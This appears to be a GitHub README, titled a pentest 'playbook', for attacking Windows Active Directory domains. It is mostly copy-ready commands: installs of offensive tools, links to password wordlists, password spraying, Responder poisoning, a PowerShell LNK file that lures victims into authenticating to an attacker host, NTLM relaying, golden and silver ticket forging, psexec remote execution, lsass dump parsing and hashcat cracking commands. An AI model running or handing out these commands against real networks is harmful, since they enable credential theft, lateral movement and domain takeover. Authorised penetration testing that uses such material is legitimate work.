# Gunnajs-Playbook
How to pentest like a Gunnaj

![alt text](https://github.com/GunzyPunzy/Gunnajs-Playbook/blob/main/anfader.jpg)

## Tools bby
### linWinPwn - Active Directory Vulnerability Scanner
https://github.com/lefayjey/linWinPwn
<details>
  <summary> Install </summary> 
```bash
git clone https://github.com/lefayjey/linWinPwn
cd linWinPwn; chmod +x linWinPwn.sh
```
```bash
chmod +x install.sh
./install.sh
```  
</details>


### tmux
https://github.com/tmux/tmux/wiki
```bash
apt install tmux
```
#### If you get lost
https://tmuxcheatsheet.com/

### BloodHound
https://github.com/BloodHoundAD/Bloodhound
```bash
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable latest' > /etc/apt/sources.list.d/neo4j.list
sudo apt-get update
```
```bash
sudo apt-get install apt-transport-https
```
```bash
sudo apt-get install neo4j
```
```bash
sudo systemctl stop neo4j
```
```bash
cd /usr/bin
```
```bash
./neo4j console
```
```bash
sudo systemctl start neo4j
```
```bash
https://localhost:7474/
```
```bash
sudo npm install -g electron-packager
```
```bash
git clone https://github.com/BloodHoundAD/Bloodhound
```
```bash
npm install
```
```bash
npm run build:linux
```

### pypykatz
https://github.com/skelsec/pypykatz

#### Install prerequirements
```bash
pip3 install minidump minikerberos aiowinreg msldap winacl
```
#### Clone this repo
```bash
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
```
#### Install it
```bash
python3 setup.py install
```

### Responder
https://github.com/lgandx/Responder

### breach-parse
https://github.com/hmaverickadams/breach-parse

### PRET
https://github.com/RUB-NDS/PRET
```bash
git clone https://github.com/RUB-NDS/PRET && cd PRET
```
```bash
python -m pip install colorama pysnmP
```

## Wordlists bby
### Generate wordlist
https://zzzteph.github.io/weakpass/

### Top 10 million
https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt (8.1 MB)

### Crackstation
https://crackstation.net/files/crackstation.txt.gz (14.6 GB)

### Large p-list
https://download.g0tmi1k.com/wordlists/large/36.4GB-18_in_1.lst.7z (48.4 GB)

### Rockyou2021
https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)

# VEV
## Nmap
#### Ping scan
```bash
sudo nmap -sP -p -oN <output.txt> <IP/mask>
```

#### Full scan
```bash
sudo nmap -PN -sC -sV -p- -oN <output.txt> <IP/mask>
```

#### smb vuln scan
```bash
sudo nmap -PN --script smb-vuln* -p139,445 -oN <output.txt> <IP/mask>
```

## Find DC IP
#### Show domain name and DNS
```bash
sudo mncli dev show eth0
```

#### Show DC IP
```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.<AD_domain>
```

#### Show DC controllers in cmd
```bash
nltest /dclist:<domainname>
```

## linWinPwn 
### Unauthenticated
- Module ad_enum
    - RID bruteforce using crackmapexec
    - Anonymous enumeration using crackmapexec, enum4linux-ng, ldapdomaindump, ldeep
    - Pre2k authentication check on collected list of computers
- Module kerberos
    - kerbrute user spray
    - ASREPRoast using collected list of users (and cracking hashes using john-the-ripper and the rockyou wordlist)
    - Blind Kerberoast
    - CVE-2022-33679 exploit
- Module scan_shares
    - SMB shares anonymous enumeration on identified servers
- Module vuln_checks
    - Enumeration for WebDav, dfscoerce, shadowcoerce and Spooler services on identified servers
    - Check for ms17-010, zerologon, petitpotam, nopac, smb-sigining, ntlmv1, runasppl weaknesses
```bash
 sudo ./linWinPwn.sh -t <Domain_Controller_IP_or_Target_Domain> -M user <output_dir>
```

### With AD-user credentials 
- DNS extraction using adidnsdump
- Module ad_enum
    - BloodHound data collection
    - Enumeration using crackmapexec, enum4linux-ng, ldapdomaindump, windapsearch, SilentHound, ldeep
        - Users
        - MachineAccountQuota
        - Password Policy
        - Users' descriptions containing "pass"
        - ADCS
        - Subnets
        - GPP Passwords
        - Check if ldap-signing is enforced, check for LDAP Relay
        - Delegation information
    - crackmapexec find accounts with user=pass 
    - Pre2k authentication check on domain computers
    - Extract ADCS information using certipy and certi.py
 
- Module kerberos
    - kerbrute find accounts with user=pas
    - ASREPRoasting (and cracking hashes using john-the-ripper and the rockyou wordlist)
    - Kerberoasting (and cracking hashes using john-the-ripper and the rockyou wordlist)
    - Targeted Kerberoasting (and cracking hashes using john-the-ripper and the rockyou wordlist)
- Module scan_shares
    - SMB shares enumeration on all domain servers using smbmap and cme's spider_plus
    - KeePass files and processes discovery on all domain servers
- Module vuln_checks
    - Enumeration for WebDav, dfscoerce, shadowcoerce and Spooler services on all domain servers
    - Check for ms17-010, ms14-068, zerologon, petitpotam, nopac, smb-signing, ntlmv1, runasppl weaknesses
- Module mssql_enum
    - Check mssql privilege escalation paths
```bash
sudo ./linWinPwn.sh -t <Domain_Controller_IP> -u <AD_user> -p <AD_password> -o <output_dir>
```

### With administrator Account (using password, NTLM hash or Kerberos ticket)
- All of the "Standard User" checks
- Module pwd_dump
    - LAPS and gMSA dump
    - secretsdump on all domain servers
    - NTDS dump using impacket, crackmapexec and certsync
    - Dump lsass on all domain servers using: procdump, lsassy, nanodump, handlekatz, masky 
    - Extract backup keys using DonPAPI, HEKATOMB
```bash
sudo ./linWinPwn.sh -t <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> or <hash_LM:NT]> or <kerbticket[./krb5cc_ticket]> -o <output_dir>
```

## Dump for Bloodhuound
```bash
./bloodhound.py -c All -u <AD_user> -p <AD_password> -dc  <FQDN_AD_domain_name> -d  <AD_domain_name> -ns <DNS_IP>
```

## Password spray
### Spray a password on a user list
```bash

crackmapexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on-success
```

## Responder
### Kickstart responder
```bash
responder -I eth0
```

### Force lm downgrade
```bash
responder -I eth0 --lm
```

### Responder LNK ifle

#### In Powershell, use each command to create a linkfile for Responder
```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\Users\<User>\Desktop\<name>.lnk")
$lnk.TargetPath = "\\<ResponderIP>\@threat.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the dir this file lives in will perform an authentication request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

### Crackmapexec NTLM-relay
#### Evaluate no smb-signing and create an IP txt file for TLMRelayx
```bash
crackmapexec smb <IPs> --gen-relay-list <outputIPs.txt>
```

#### NTLMRelayx
```bash
sudo python3 ntlmrelayx.py -smb2support -tf <outputIPs.txt>
```

#### Disbale SMB and HTTP in Responder.conf
```bash
[Responder Core]

; Servers to start
SQL = On
SMB = Off
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On
SNMP = Off
```

## pypykatz
### Examine lsass dump
```bash
pypykatz lsa minidump lsass.DMP
```

## golden and silver tickets
#### Get user SID value by using the Windows Terminal
```cmd
wmic useraccount where name="USER" get sid
```

#### Silver ticket
```bash
python3 ticketer.py -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain> -dc-ip <Domain_Controller_IP> -spn <service>/<AD_domain>l <user>
```
#### Golden ticket
```bash
python3 ticketer.py -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain> -dc-ip <Domain_Controller_IP> <user>
```
#### Set the ticket for impacket use
```bash
export KRB5CCNAME=<TGS_ccache_file>
```

#### List tickets
```bash
klist
```

#### Execute remote commands with any of the following by using the TGT
```bash
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

## SMB VEV
### Mount share
```bash
sudo mount.cifs <//ip/folder> <./folder> -o user=<username>,password=<password>,dom=<AD_domain>
```

### Unmount share
```bash
sudo umount <./folder>
```

### Search for keywords in files
```bash
grep -i <keyword> *
```

## PRET
### Nmap printers
```bash
nmap -p 9100 <IP/mask>
```
### cheat sheet
```bash
http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet
```
### Kickstart PRET 
```bash
pret.py target {ps,pjl,pcl}
```

## Hash cracking
### LM
```bash
hashcat64.exe -m 3000 -a 3 LM-hashes.txt -o cracked.txt
```

### NTLM
```bash
hashcat64.exe -m 1000 -a 3 NTLM-hashes.txt -o cracked.txt
```

### NTLMv1
```bash
hashcat64.exe -m 5500 -a 3 NTLMv1-hashes.txt -o cracked.txt
```

### NTLMv2
```bash
hashcat64.exe -m 5600 -a 0 NTLMv2-hashes.txt <passlist.txt> -o cracked.txt
```

### Kerberos ASREP
```bash
hashcat64.exe -m 18200 -a 0 asrep-hashes.txt <passlist.txt> -o cracked.txt
```

### Kerberos 5 TGS
```bash
hashcat64.exe -m 13100 -a 0 krb5tgs-hashes.txt <passlist.txt> -o cracked.txt
```

### Kerberos 5 TGS AES128
```bash
hashcat64.exe -m 19600 -a 0 krb5tgsaes128-hashes.txt <passlist.txt> -o cracked.txt
```

### Kerberos 5 TGS AES256
```bash
hashcat64.exe -m 19700  -a 0 krb5tgsaes256.txt <passlist.txt> -o cracked.txt
```

### Kerberos 5 etype 17, Pre-Auth
```bash
hashcat64.exe -m 19800  -a 0 krb5tetype17.txt <passlist.txt> -o cracked.txt
```

### Kerberos 5 etype 18, Pre-Auth
```bash
hashcat64.exe -m 19900  -a 0 krb5tetype18.txt <passlist.txt> -o cracked.txt
```

### MsCache 2 (slow af)
```bash
hashcat64.exe -m 2100 -a 0 mscache2-hashes.txt <passlist.txt> -o cracked.txt
```
